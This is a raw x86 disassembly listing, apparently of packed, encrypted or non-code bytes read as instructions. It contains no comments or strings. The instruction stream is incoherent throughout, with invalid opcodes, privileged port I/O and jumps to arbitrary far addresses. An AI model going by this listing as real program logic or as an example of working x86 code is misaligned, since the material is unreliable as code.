  41e692:	sahf   
  41e693:	fs js  0x41e6c6
  41e696:	push   ss
  41e697:	pop    edi
  41e698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e699:	xchg   ebx,eax
  41e69a:	rol    BYTE PTR [edx-0x16],0xf8
  41e69e:	xor    eax,0x1b248217
  41e6a3:	push   edi
  41e6a4:	sbb    ch,al
  41e6a6:	or     dl,BYTE PTR [esp+0x33]
  41e6aa:	dec    ebp
  41e6ab:	imul   edi,DWORD PTR [eax],0xaa41de45
  41e6b1:	jns    0x41e6ff
  41e6b3:	div    DWORD PTR [esi+eiz*2+0x49]
  41e6b7:	pop    ebp
  41e6b8:	adc    DWORD PTR [esp+eax*2+0x1a705d2f],edi
  41e6bf:	fs jnp 0x41e73e
  41e6c2:	xor    eax,0x4528a19d
  41e6c7:	jg     0x41e678
  41e6c9:	sti    
  41e6ca:	sti    
  41e6cb:	in     al,dx
  41e6cc:	(bad)  
  41e6cd:	mov    bh,0xf9
  41e6cf:	or     edi,edx
  41e6d1:	push   es
  41e6d2:	dec    edi
  41e6d3:	fwait
  41e6d4:	fwait
  41e6d5:	mov    ebx,0x5cea924d
  41e6da:	in     eax,dx
  41e6db:	ja     0x41e6de
  41e6dd:	adc    eax,0xe31f02f6
  41e6e2:	stc    
  41e6e3:	sbb    BYTE PTR [ecx-0x74],al
  41e6e6:	es ins DWORD PTR es:[edi],dx
  41e6e8:	and    BYTE PTR [edx],bh
  41e6ea:	outs   dx,DWORD PTR ds:[esi]
  41e6eb:	jg     0x41e752
  41e6ed:	and    DWORD PTR [esi-0x67],ebx
  41e6f0:	scas   eax,DWORD PTR es:[edi]
  41e6f1:	jg     0x41e75e
  41e6f3:	add    DWORD PTR [edx+0x5e],eax
  41e6f6:	mov    edi,0xad31a58a
  41e6fb:	push   esi
  41e6fc:	out    dx,eax
  41e6fd:	nop
  41e6fe:	enter  0xecc5,0xcb
  41e702:	int    0xb9
  41e704:	push   esp
  41e706:	or     eax,DWORD PTR [edx-0x26b59657]
  41e70c:	loopne 0x41e72e
  41e70e:	xchg   edx,eax
  41e70f:	push   ecx
  41e710:	data16 jge 0x41e76a
  41e713:	dec    esp
  41e714:	xor    eax,0xa1889de9
  41e719:	adc    eax,0x907f017b
  41e71e:	jne    0x41e784
  41e720:	jb     0x41e74a
  41e722:	push   eax
  41e723:	pop    es
  41e724:	mov    dh,0x7b
  41e726:	adc    DWORD PTR [ecx+0x33ecd295],eax
  41e72c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e72d:	sar    BYTE PTR [ebx],0xef
  41e730:	paddsw mm1,QWORD PTR [ebx+ebx*2-0x2ad9c3d6]
  41e738:	jge    0x41e794
  41e73a:	in     eax,dx
  41e73b:	adc    eax,0x918847d6
  41e740:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e741:	shl    BYTE PTR [edi+0x1e],cl
  41e744:	scas   al,BYTE PTR es:[edi]
  41e745:	and    al,0x4b
  41e747:	jns    0x41e7be
  41e749:	out    0x15,al
  41e74b:	mov    DWORD PTR [edi-0x61],ebx
  41e74e:	addr16 cs iret 
  41e751:	sbb    DWORD PTR [esi+0x59],eax
  41e754:	outs   dx,DWORD PTR ds:[esi]
  41e755:	jo     0x41e752
  41e757:	cmp    eax,0xb0e2c8df
  41e75c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e75d:	in     al,0x44
  41e75f:	or     DWORD PTR [ebx],edi
  41e761:	or     BYTE PTR cs:[esi-0x1e44ee47],0x9d
  41e769:	test   DWORD PTR [ecx+0x7e3b7775],0x7c655fcc
  41e773:	add    BYTE PTR [eax-0x64],ch
  41e776:	dec    eax
  41e777:	mov    edx,0xb0e4d828
  41e77c:	push   edx
  41e77d:	(bad)  [esp+edx*2-0x7b]
  41e781:	(bad)
  41e784:	and    eax,0x9593af90
  41e789:	bound  ebx,QWORD PTR [ebp-0x2bee72e6]
  41e78f:	xchg   ecx,eax
  41e790:	enter  0xf96,0x76
  41e794:	loope  0x41e786
  41e796:	cdq    
  41e797:	cmp    BYTE PTR [ecx+0x4756c2b1],ch
  41e79d:	sub    eax,0xd7165820
  41e7a2:	push   eax
  41e7a3:	fldcw  WORD PTR [edi+ecx*8]
  41e7a6:	loopne 0x41e7c0
  41e7a8:	jge    0x41e785
  41e7aa:	adc    DWORD PTR [ecx+0x45abcade],edx
  41e7b0:	adc    ebx,DWORD PTR [edi-0x4d]
  41e7b3:	lea    ebx,[edx+0x6a2232cb]
  41e7b9:	and    DWORD PTR [edi+ebp*8+0x6769d5],eax
  41e7c0:	in     eax,0x68
  41e7c2:	push   cs
  41e7c3:	call   0xa0dd:0x4487ee42
  41e7ca:	(bad)  
  41e7cb:	or     al,0x50
  41e7cd:	push   es
  41e7ce:	add    dl,BYTE PTR [ecx]
  41e7d0:	lods   eax,DWORD PTR ds:[esi]
  41e7d1:	xor    DWORD PTR [ebx-0x2b],0x3
  41e7d5:	jmp    0x7ba3f0a6
  41e7da:	frstor es:[esi+0x60eb0771]
  41e7e1:	mov    ?,WORD PTR [ebx-0x49c149de]
  41e7e7:	cli    
  41e7e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7e9:	or     esp,DWORD PTR ds:0xa63b17a6
  41e7ef:	addr16 jmp 0x7b7:0x62017e44
  41e7f7:	out    0xf8,al
  41e7f9:	out    0xaa,eax
  41e7fb:	mov    bl,0x3d
  41e7fd:	or     bh,bl
  41e7ff:	cmp    eax,DWORD PTR [eax]
  41e801:	sbb    bl,BYTE PTR [edi]
  41e803:	or     bl,ch
  41e805:	mov    ds:0x422b4ef0,al
  41e80a:	inc    esp
  41e80b:	sbb    DWORD PTR [ebp+0x38dfb100],esi
  41e811:	cli    
  41e812:	pop    eax
  41e813:	adc    dl,cl
  41e815:	dec    edx
  41e816:	mov    bh,0xc8
  41e818:	(bad)  
  41e819:	pop    ss
  41e81a:	ins    BYTE PTR es:[edi],dx
  41e81b:	je     0x41e7d6
  41e81d:	and    BYTE PTR [esi],dl
  41e81f:	and    eax,0x7e974c64
  41e824:	add    ah,BYTE PTR [edi]
  41e826:	fs push 0x11fd8441
  41e82c:	xchg   ecx,eax
  41e82d:	ret    0x5bc8
  41e830:	iret   
  41e831:	les    esp,FWORD PTR [edi-0x57cb2ea3]
  41e837:	jbe    0x41e85b
  41e839:	xchg   esi,eax
  41e83a:	xor    ch,BYTE PTR [ecx]
  41e83c:	sahf   
  41e83d:	or     eax,0xff33b7a9
  41e842:	outs   dx,BYTE PTR ds:[esi]
  41e843:	pushf  
  41e844:	(bad)  
  41e845:	mov    bh,0xb8
  41e847:	repz inc edi
  41e849:	pop    ecx
  41e84a:	daa    
  41e84b:	inc    ebx
  41e84c:	call   0x497:0x4a97e3c4
  41e853:	and    eax,edx
  41e855:	push   eax
  41e856:	icebp  
  41e857:	(bad)  
  41e858:	pop    eax
  41e859:	call   0x73d01fcc
  41e85e:	ja     0x41e86d
  41e860:	adc    eax,0xfb692f3f
  41e865:	jno    0x41e846
  41e867:	aam    0x63
  41e869:	jne    0x41e86b
  41e86b:	inc    ebp
  41e86c:	pop    ebx
  41e86d:	dec    ebx
  41e86e:	mov    dh,0xa6
  41e870:	push   ebp
  41e871:	pop    edi
  41e872:	or     bh,al
  41e874:	pop    eax
  41e875:	clc    
  41e876:	mov    al,ds:0xb07cc24b
  41e87c:	mov    dl,0x3b
  41e87e:	imul   esp,eax,0x5e7ad57a
  41e884:	xchg   edx,eax
  41e885:	mov    eax,ds:0x863bfb5c
  41e88a:	push   ebp
  41e88b:	add    eax,0x5ecba8f
  41e890:	add    eax,0x24c335a5
  41e895:	lea    ebx,[ebp-0x70550dfd]
  41e89b:	fimul  WORD PTR [edx+eiz*4-0x7]
  41e89f:	std    
  41e8a0:	mov    esi,0x9ad0f196
  41e8a5:	test   BYTE PTR [edi],ch
  41e8a7:	ins    DWORD PTR es:[edi],dx
  41e8a8:	jns    0x41e8dd
  41e8aa:	pushf  
  41e8ab:	push   edx
  41e8ac:	call   0xc01091ea
  41e8b1:	pusha  
  41e8b2:	push   cs
  41e8b3:	mov    ebx,DWORD PTR [eax]
  41e8b5:	push   cs
  41e8b6:	mov    eax,0xbd270e01
  41e8bb:	inc    ebp
  41e8bc:	sub    ch,BYTE PTR [edi+0x7cbc8d8a]
  41e8c2:	mov    cl,0x8a
  41e8c4:	adc    eax,0x790a3086
  41e8c9:	pop    ss
  41e8ca:	jmp    0x41e88d
  41e8cc:	xchg   esi,eax
  41e8cd:	dec    eax
  41e8ce:	jmp    0x41e8a7
  41e8d0:	test   BYTE PTR [edi],bl
  41e8d2:	or     ah,BYTE PTR [ecx]
  41e8d4:	mov    dh,0xfb
  41e8d6:	int    0xfb
  41e8d8:	push   ebx
  41e8d9:	cmc    
  41e8da:	xor    dh,ah
  41e8dc:	dec    ebp
  41e8dd:	xlat   BYTE PTR ds:[ebx]
  41e8de:	sti    
  41e8df:	push   0xe
  41e8e1:	push   edi
  41e8e2:	push   edi
  41e8e3:	jg     0x41e8ca
  41e8e5:	mov    fs:0xbd61fe63,al
  41e8eb:	jbe    0x41e8d5
  41e8ed:	jb     0x41e8c0
  41e8ef:	cmp    edi,ebp
  41e8f1:	inc    ecx
  41e8f2:	loop   0x41e890
  41e8f4:	fidivr DWORD PTR [ecx-0x2e06fa40]
  41e8fa:	jae    0x41e970
  41e8fc:	jb     0x41e963
  41e8fe:	push   ss
  41e8ff:	je     0x41e888
  41e901:	sbb    dh,BYTE PTR [esi+0x7551956e]
  41e907:	outs   dx,DWORD PTR ds:[esi]
  41e908:	or     bl,BYTE PTR [ebx]
  41e90a:	mov    bl,0xa3
  41e90c:	mov    BYTE PTR [ecx+0xe1949f1],cl
  41e912:	or     dh,bh
  41e914:	push   ebp
  41e915:	das    
  41e916:	fnstcw WORD PTR [ebx+0x39]
  41e919:	or     BYTE PTR ss:[eax+esi*8+0x3b8bebd5],dl
  41e921:	(bad)  
  41e922:	sbb    eax,ebp
  41e924:	repz add al,0xaa
  41e927:	mov    ?,WORD PTR [ecx-0x57e89634]
  41e92d:	dec    ecx
  41e92e:	sbb    al,BYTE PTR [edx+edx*8-0x13]
  41e932:	cmp    ch,BYTE PTR [ebx+0x77]
  41e935:	or     eax,0x2c7f0e8b
  41e93a:	jo     0x41e929
  41e93c:	mov    BYTE PTR [edi-0x3a705be9],cl
  41e942:	addr16 mov ebp,0xe30b125b
  41e948:	call   0x4620:0x18ffbf42
  41e94f:	cs daa 
  41e951:	test   al,0xf2
  41e953:	xor    eax,0xaccba7f1
  41e958:	sbb    eax,0x8ac2a5ee
  41e95d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e95e:	jno    0x41e9bc
  41e960:	repz sahf 
  41e962:	(bad)  
  41e963:	ss pop ebp
  41e965:	call   0x822b:0xfd5d23da
  41e96c:	div    DWORD PTR ds:0x7c5bb1a5
  41e972:	sahf   
  41e973:	gs inc esp
  41e975:	push   esi
  41e976:	sub    ebx,DWORD PTR [ebp-0x45]
  41e979:	(bad)  
  41e97a:	test   al,0x18
  41e97c:	mov    esi,0x867f5964
  41e981:	jne    0x41e99f
  41e983:	daa    
  41e984:	shr    BYTE PTR [esi-0x2e175e08],1
  41e98a:	adc    eax,0xef9a727e
  41e98f:	cmc    
  41e990:	push   edi
  41e991:	mov    eax,ds:0x616434af
  41e996:	aam    0x54
  41e998:	fstp   QWORD PTR [esi+eiz*1-0x5a3c1cc2]
  41e99f:	jmp    0x7cb50731
  41e9a4:	xor    BYTE PTR [edx-0x4785403b],bh
  41e9aa:	xchg   ecx,eax
  41e9ab:	shl    BYTE PTR ds:0xa0f6c867,cl
  41e9b1:	pop    edx
  41e9b2:	add    eax,0x1c1e9b1f
  41e9b7:	sbb    eax,0xe7847ecf
  41e9bc:	push   eax
  41e9bd:	mov    al,ds:0xc0a140dc
  41e9c2:	(bad)  
  41e9c3:	jmp    0x41ea22
  41e9c5:	mov    dh,0x95
  41e9c7:	or     al,0x58
  41e9c9:	or     DWORD PTR [eax+edx*4],esp
  41e9cc:	inc    edi
  41e9cd:	push   edi
  41e9ce:	lock (bad) 
  41e9d0:	retf   
  41e9d1:	inc    ebx
  41e9d2:	pop    esp
  41e9d3:	push   es
  41e9d4:	push   ebp
  41e9d5:	pop    esp
  41e9d6:	fst    QWORD PTR [ecx+edi*4-0x4b95679b]
  41e9dd:	scas   al,BYTE PTR es:[edi]
  41e9de:	inc    eax
  41e9df:	adc    eax,0x4faf02f7
  41e9e4:	js     0x41ea21
  41e9e6:	pusha  
  41e9e7:	loop   0x41e9aa
  41e9e9:	adc    BYTE PTR [eax+ebp*4+0x2b],ch
  41e9ed:	into   
  41e9ee:	fist   DWORD PTR [eax-0x4b]
  41e9f1:	aad    0xd8
  41e9f3:	and    al,dh
  41e9f5:	mov    ds,esp
  41e9f7:	push   0x4b
  41e9f9:	lods   eax,DWORD PTR ds:[esi]
  41e9fa:	adc    eax,0x292409d9
  41e9ff:	ja     0x41e9ec
  41ea01:	mov    ebx,0xb72cc649
  41ea06:	or     al,BYTE PTR [ecx+0x40c32ee0]
  41ea0c:	adc    al,0x4e
  41ea0e:	pop    edi
  41ea0f:	jnp    0x41e9a7
  41ea11:	mov    ebx,0xed128830
  41ea16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea17:	cdq    
  41ea18:	jmp    0x39763582
  41ea1d:	dec    eax
  41ea1e:	repz cwde 
  41ea20:	jno    0x41e9d7
  41ea22:	adc    DWORD PTR [ebp+0x72524470],ebp
  41ea28:	and    ebp,DWORD PTR [esi-0x7cf3056a]
  41ea2e:	push   ss
  41ea2f:	in     al,dx
  41ea30:	push   es
  41ea31:	pop    ds
  41ea32:	(bad)  
  41ea33:	fsub   QWORD PTR [ebx+0x6f628142]
  41ea39:	mov    bh,0x58
  41ea3b:	jp     0x41ea6a
  41ea3d:	push   ecx
  41ea3e:	add    al,0xc2
  41ea40:	pop    ebx
  41ea41:	and    ebx,ebx
  41ea43:	(bad)  
  41ea44:	xchg   DWORD PTR ss:[ebx-0x1e],ebp
  41ea48:	fwait
  41ea49:	adc    ah,BYTE PTR [ebx]
  41ea4b:	(bad)  
  41ea4c:	test   al,0xe8
  41ea4e:	fcomp  st(7)
  41ea50:	outs   dx,DWORD PTR ds:[esi]
  41ea51:	cdq    
  41ea52:	pop    ds
  41ea53:	jbe    0x41eaa5
  41ea55:	adc    eax,0xe47dc690
  41ea5a:	jb     0x41ea25
  41ea5c:	cmp    eax,0xe5f91c0d
  41ea61:	sbb    esi,DWORD PTR [ecx+eax*1-0x1b]
  41ea65:	dec    ebp
  41ea66:	push   ss
  41ea67:	and    DWORD PTR [ebx],ecx
  41ea69:	fidiv  DWORD PTR ds:0x208bd9dc
  41ea6f:	mov    bl,0xdd
  41ea71:	add    eax,0x64ebb416
  41ea76:	adc    ah,BYTE PTR [ebx]
  41ea78:	imul   eax,DWORD PTR [edx+0x72],0xfffffffe
  41ea7c:	retf   
  41ea7d:	jno    0x41ea06
  41ea7f:	inc    eax
  41ea80:	xor    al,0x1c
  41ea82:	arpl   WORD PTR [edx-0x63],dx
  41ea85:	dec    eax
  41ea86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea87:	push   edi
  41ea88:	jmp    0x676d8f64
  41ea8d:	mov    esi,0x5eec2797
  41ea92:	cdq    
  41ea93:	ds jne 0x41eabc
  41ea96:	cdq    
  41ea97:	fcomp  QWORD PTR [eax-0x5b]
  41ea9a:	mov    edx,0x42306004
  41ea9f:	push   0x3a
  41eaa1:	outs   dx,DWORD PTR ds:[esi]
  41eaa2:	cmp    edi,DWORD PTR [edi-0x6ca34e8d]
  41eaa8:	pop    es
  41eaa9:	push   ss
  41eaaa:	add    dl,BYTE PTR [ebp+edx*2-0x7e]
  41eaae:	mov    bl,0x9
  41eab0:	fdiv   QWORD PTR [ecx-0x49]
  41eab3:	sub    BYTE PTR [esi-0x7f013e8a],dh
  41eab9:	inc    edi
  41eaba:	arpl   WORD PTR [eax],di
  41eabc:	add    eax,0x9ffa510b
  41eac1:	xor    ah,dh
  41eac3:	dec    eax
  41eac4:	imul   esp,DWORD PTR [ecx],0x5c9f8a64
  41eaca:	xor    ch,ah
  41eacc:	dec    edx
  41eacd:	std    
  41eace:	xor    ch,BYTE PTR [esi]
  41ead0:	mov    esp,0x9cd7b0e8
  41ead5:	hlt    
  41ead6:	sub    al,0x45
  41ead8:	out    dx,eax
  41ead9:	arpl   si,si
  41eadb:	mov    ds:0xd440febe,al
  41eae0:	in     al,dx
  41eae1:	mov    BYTE PTR [edi-0x78e162f7],ch
  41eae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eae8:	and    esp,ebp
  41eaea:	ja     0x41ead9
  41eaec:	jnp    0x41eb44
  41eaee:	ja     0x41eb47
  41eaf0:	xchg   edx,eax
  41eaf1:	push   esp
  41eaf2:	mov    DWORD PTR [ebx+ecx*4],ecx
  41eaf5:	pop    edi
  41eaf6:	aad    0xaf
  41eaf8:	push   ebx
  41eaf9:	call   0xd7f2:0xed764da2
  41eb00:	mov    dl,ah
  41eb02:	mov    edi,0x277dab15
  41eb07:	retf   
  41eb08:	dec    esp
  41eb0a:	es out 0xf4,al
  41eb0d:	jge    0x41eab2
  41eb0f:	call   0x82b2:0x1fe3b436
  41eb16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb17:	mov    edx,0xf65ac68f
  41eb1c:	mov    WORD PTR [ecx],ss
  41eb1e:	in     eax,dx
  41eb1f:	pusha  
  41eb20:	retf   0x8732
  41eb23:	mov    DWORD PTR [ecx-0x6faecef7],0xa14feb54
  41eb2d:	or     edx,DWORD PTR [ecx-0x23205486]
  41eb33:	retf   0x748d
  41eb36:	push   edx
  41eb37:	xchg   BYTE PTR [edx+0x5b26b044],cl
  41eb3d:	push   edx
  41eb3e:	scas   al,BYTE PTR es:[edi]
  41eb3f:	call   0xadf17f57
  41eb44:	stos   DWORD PTR es:[edi],eax
  41eb45:	je     0x41eade
  41eb47:	lods   al,BYTE PTR ds:[esi]
  41eb48:	cmp    eax,0xd9f32c80
  41eb4d:	call   0x244f:0x8722b1c
  41eb54:	outs   dx,BYTE PTR ds:[esi]
  41eb55:	mov    fs,edx
  41eb57:	dec    ecx
  41eb58:	and    BYTE PTR [edx+0x46dcee09],ch
  41eb5e:	push   eax
  41eb5f:	fwait
  41eb60:	mov    dl,BYTE PTR [ebp-0x26]
  41eb63:	movq   mm1,QWORD PTR [ebp+edx*4-0x36]
  41eb68:	es addr16 retf 0xda86
  41eb6d:	sub    edx,ebp
  41eb6f:	jno    0x41ebcf
  41eb71:	or     ah,BYTE PTR [ebx]
  41eb73:	cdq    
  41eb74:	cmp    bl,bl
  41eb76:	mov    ds:0xeb20a2f3,al
  41eb7b:	fisub  DWORD PTR [edi+eiz*2]
  41eb7e:	push   ds
  41eb7f:	inc    edx
  41eb80:	mov    bh,BYTE PTR [esi-0x53]
  41eb83:	and    BYTE PTR [edi+0x6b],bl
  41eb86:	or     eax,0x627fa4bd
  41eb8b:	sub    BYTE PTR [esi],ch
  41eb8d:	imul   eax,ebp,0xffffffbf
  41eb90:	shr    ch,1
  41eb92:	push   esi
  41eb93:	cdq    
  41eb94:	enter  0xcc65,0xd3
  41eb98:	jp     0x41ec01
  41eb9a:	dec    ebx
  41eb9b:	jmp    0xe307:0xa465af61
  41eba2:	pushf  
  41eba3:	in     eax,dx
  41eba4:	pop    ecx
  41eba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eba6:	and    DWORD PTR [edi-0x303b353b],edx
  41ebac:	loop   0x41ebc8
  41ebae:	aam    0x9c
  41ebb0:	inc    ebx
  41ebb1:	mov    bl,0x53
  41ebb3:	arpl   si,bp
  41ebb5:	daa    
  41ebb6:	pop    ds
  41ebb7:	lock call 0x98926dc
  41ebbd:	jae    0x41eb84
  41ebbf:	xchg   edx,eax
  41ebc0:	daa    
  41ebc1:	aaa    
  41ebc2:	aad    0x74
  41ebc4:	fild   WORD PTR [edi*4-0x7c9fedb8]
  41ebcb:	retf   0xd4d5
  41ebce:	mov    cs,WORD PTR [edx-0x5e]
  41ebd1:	adc    DWORD PTR es:[eax+ebp*2],0x400da09f
  41ebd9:	imul   esp,DWORD PTR [ebx],0x53
  41ebdc:	movd   mm3,DWORD PTR [ebx+0x5e]
  41ebe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebe1:	jne    0x41ebf6
  41ebe3:	inc    ecx
  41ebe4:	adc    edx,DWORD PTR [ebx]
  41ebe6:	fdivr  QWORD PTR [ebp+ebx*4-0x56]
  41ebea:	add    DWORD PTR [eax+ebp*1+0x2c51bd2e],eax
  41ebf1:	shl    cl,1
  41ebf3:	pop    ecx
  41ebf4:	xlat   BYTE PTR ds:[ebx]
  41ebf5:	inc    ebx
  41ebf6:	push   edi
  41ebf7:	in     eax,dx
  41ebf8:	jbe    0x41ebc9
  41ebfa:	xchg   ecx,eax
  41ebfb:	scas   eax,DWORD PTR es:[edi]
  41ebfc:	jb     0x41eb9d
  41ebfe:	sbb    ch,BYTE PTR [edi]
  41ec00:	outs   dx,DWORD PTR ds:[esi]
  41ec01:	xchg   edx,eax
  41ec02:	pop    edi
  41ec03:	lahf   
  41ec04:	xor    BYTE PTR [ecx-0x3b],ah
  41ec07:	push   0xc2f97d6c
  41ec0c:	lds    esi,FWORD PTR [edx+0x22]
  41ec0f:	fdivrp st(3),st
  41ec11:	in     eax,dx
  41ec12:	stos   BYTE PTR es:[edi],al
  41ec13:	ret    0xc4b4
  41ec16:	das    
  41ec17:	jae    0x41ec19
  41ec19:	jmp    0xd73a:0x3d82e548
  41ec20:	mov    al,ds:0xf61a9186
  41ec25:	jmp    0x17b70a4d
  41ec2a:	(bad)  
  41ec2b:	imul   ebx,DWORD PTR [ecx+ebx*8],0x21706951
  41ec32:	mov    eax,0x97879620
  41ec37:	fucom  st(0)
  41ec39:	les    edx,FWORD PTR [eax]
  41ec3b:	inc    eax
  41ec3c:	ins    BYTE PTR es:[edi],dx
  41ec3d:	mov    BYTE PTR [edx],0xa5
  41ec40:	es pop ss
  41ec42:	(bad)  
  41ec43:	dec    ebp
  41ec44:	pop    edi
  41ec45:	mov    ds:0x46a43325,eax
  41ec4a:	xchg   ecx,eax
  41ec4b:	loope  0x41ebce
  41ec4d:	in     eax,dx
  41ec4e:	pop    edi
  41ec4f:	push   ss
  41ec50:	ret    0xc534
  41ec53:	or     al,0xf6
  41ec55:	pushf  
  41ec56:	mov    edi,0xf1840506
  41ec5b:	push   ss
  41ec5c:	xchg   edx,eax
  41ec5d:	ss aam 0xae
  41ec60:	sti    
  41ec61:	sub    BYTE PTR [ecx-0x2ce2149a],bh
  41ec67:	mov    eax,0xb0497c97
  41ec6c:	sbb    al,0x49
  41ec6e:	xchg   ecx,eax
  41ec6f:	sub    BYTE PTR [ecx-0x10],bl
  41ec72:	scas   al,BYTE PTR es:[edi]
  41ec73:	stos   DWORD PTR es:[edi],eax
  41ec74:	in     eax,dx
  41ec75:	test   BYTE PTR [ecx],0x68
  41ec78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec79:	mov    ah,0x54
  41ec7b:	sti    
  41ec7c:	push   0xffffffe7
  41ec7e:	shl    DWORD PTR ds:0xe49d81e3,cl
  41ec84:	or     al,0x15
  41ec86:	pop    edi
  41ec87:	push   ebp
  41ec88:	imul   esp,DWORD PTR [ebx+0x77],0x3b
  41ec8c:	inc    edx
  41ec8d:	ins    BYTE PTR es:[edi],dx
  41ec8e:	(bad)  
  41ec8f:	arpl   WORD PTR [edx-0x1ddb3e2b],bx
  41ec95:	inc    edi
  41ec96:	sub    cl,BYTE PTR [esi]
  41ec98:	jb     0x41ec2b
  41ec9a:	daa    
  41ec9b:	jmp    0x41ec66
  41ec9d:	in     al,dx
  41ec9e:	sub    dh,ch
  41eca0:	adc    al,BYTE PTR [esi]
  41eca2:	fsubr  st,st(1)
  41eca4:	(bad)  [edx+0x59]
  41eca7:	xchg   ecx,eax
  41eca8:	sbb    ebx,DWORD PTR [ebp+0x2b]
  41ecab:	mov    eax,0x4a303d5e
  41ecb0:	pop    esi
  41ecb1:	test   BYTE PTR [edx+0x21e4b194],dl
  41ecb7:	imul   ebp,DWORD PTR [ebp+0x41],0x5
  41ecbb:	inc    edi
  41ecbc:	lea    edx,[ecx-0x38884b6d]
  41ecc2:	and    cl,dl
  41ecc4:	add    DWORD PTR [esi],edx
  41ecc6:	pop    es
  41ecc7:	ds inc edi
  41ecc9:	dec    ebx
  41ecca:	scas   al,BYTE PTR es:[edi]
  41eccb:	pop    esi
  41eccc:	xor    esi,ebx
  41ecce:	jl     0x41ecb7
  41ecd0:	add    al,0x86
  41ecd2:	out    dx,al
  41ecd3:	test   DWORD PTR [edi],esp
  41ecd5:	cli    
  41ecd6:	into   
  41ecd7:	push   edi
  41ecd8:	sbb    eax,0x810deec3
  41ecdd:	std    
  41ecde:	cmp    bl,BYTE PTR [ebp+0x40]
  41ece1:	ret    0xe565
  41ece4:	cs out 0x5,al
  41ece7:	jnp    0x41ec8e
  41ece9:	mov    eax,0x1001f9e6
  41ecee:	pop    edx
  41ecef:	inc    ebp
  41ecf0:	xchg   edi,eax
  41ecf1:	(bad)  
  41ecf2:	hlt    
  41ecf3:	adc    BYTE PTR [ecx-0x5e],dh
  41ecf6:	cwde   
  41ecf7:	bound  esp,QWORD PTR [ecx-0x4c]
  41ecfa:	adc    al,0x2a
  41ecfc:	mov    al,0x6a
  41ecfe:	stc    
  41ecff:	push   cs
  41ed00:	jge    0x41ed12
  41ed02:	ss push 0x46
  41ed05:	int3   
  41ed06:	cmp    bl,cl
  41ed08:	test   BYTE PTR [ebp+ebx*8+0x4934018e],al
  41ed0f:	adc    al,0x4
  41ed11:	dec    esp
  41ed12:	sbb    eax,DWORD PTR [ecx+0x3b]
  41ed15:	inc    edi
  41ed16:	add    BYTE PTR [ebx-0x50],dl
  41ed19:	sub    dh,al
  41ed1b:	push   ecx
  41ed1c:	mov    ebp,0xd892a816
  41ed21:	sti    
  41ed22:	or     eax,0x766d70ef
  41ed27:	ins    BYTE PTR es:[edi],dx
  41ed28:	adc    DWORD PTR [eax+0x44909af6],edi
  41ed2e:	sti    
  41ed2f:	(bad)  
  41ed30:	repz mov WORD PTR [edi+0x2eb87dd4],ss
  41ed37:	sahf   
  41ed38:	ss pop edi
  41ed3a:	rcl    BYTE PTR [ebx],1
  41ed3c:	clc    
  41ed3d:	retf   0xf8ce
  41ed40:	(bad)  
  41ed41:	cmp    eax,0x5aab400d
  41ed46:	jecxz  0x41ed1d
  41ed48:	out    0x36,eax
  41ed4a:	aam    0xa8
  41ed4c:	lock jnp 0x41ed37
  41ed4f:	pushf  
  41ed50:	cli    
  41ed51:	enter  0xaea9,0xac
  41ed55:	xor    ch,BYTE PTR [esi+0x491ba719]
  41ed5b:	popa   
  41ed5c:	xlat   BYTE PTR ds:[ebx]
  41ed5d:	mov    ah,0x83
  41ed5f:	rcr    edx,cl
  41ed61:	push   ebx
  41ed62:	stos   DWORD PTR es:[edi],eax
  41ed63:	lock out 0x37,al
  41ed66:	lods   eax,DWORD PTR ds:[esi]
  41ed67:	shr    DWORD PTR [ecx],cl
  41ed69:	jo     0x41ecf2
  41ed6b:	imul   ebp,eax,0x88bc13b
  41ed71:	jne    0x41ede1
  41ed73:	or     ah,bl
  41ed75:	out    dx,eax
  41ed76:	repnz lahf 
  41ed78:	int    0x29
  41ed7a:	xlat   BYTE PTR ds:[ebx]
  41ed7b:	ins    BYTE PTR es:[edi],dx
  41ed7c:	mov    al,ds:0x280c9449
  41ed81:	jo     0x41edd7
  41ed83:	mov    ecx,0xc8a501d2
  41ed88:	fild   DWORD PTR [eax-0x33]
  41ed8b:	aad    0xae
  41ed8d:	or     eax,0xa0ddb98d
  41ed92:	sbb    BYTE PTR [edi+edi*8-0x17],bh
  41ed96:	addr16 xchg edi,eax
  41ed98:	adc    al,BYTE PTR [edx+ebx*8]
  41ed9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed9c:	lock sahf 
  41ed9e:	call   0x7465:0xafb1b6e2
  41eda5:	daa    
  41eda6:	adc    eax,0xac66bc01
  41edab:	shl    ah,1
  41edad:	mov    bh,0x3f
  41edaf:	and    ebp,DWORD PTR [edi+0x1ea66e9f]
  41edb5:	fisubr DWORD PTR [bx+di]
  41edb8:	adc    eax,0xa47c1992
  41edbd:	fsub   DWORD PTR [ebx]
  41edbf:	ins    BYTE PTR es:[edi],dx
  41edc0:	mov    bh,0xb
  41edc2:	test   DWORD PTR [edi],esi
  41edc4:	fcom   DWORD PTR [ebp-0x66]
  41edc7:	push   ecx
  41edc8:	inc    esp
  41edc9:	mov    ebx,0x6802135b
  41edce:	push   ebx
  41edcf:	data16 jae 0x41ed78
  41edd2:	inc    esp
  41edd3:	xor    DWORD PTR [edx+0x67135919],ecx
  41edd9:	pop    ebx
  41edda:	es sahf 
  41eddc:	pop    esi
  41eddd:	and    eax,0xc177770b
  41ede2:	dec    ecx
  41ede3:	xor    al,0x7c
  41ede5:	jmp    0xd229:0xcb52c23f
  41edec:	and    al,0x5f
  41edee:	push   ebx
  41edef:	jno    0x41ee54
  41edf1:	push   esp
  41edf2:	mov    esi,ds
  41edf4:	out    0x90,eax
  41edf6:	or     DWORD PTR [eax],edi
  41edf8:	cmp    DWORD PTR [edi+0x21dc7c5f],ecx
  41edfe:	inc    ecx
  41edff:	lds    ebx,FWORD PTR [edi+0x731c3aeb]
  41ee05:	scas   al,BYTE PTR es:[edi]
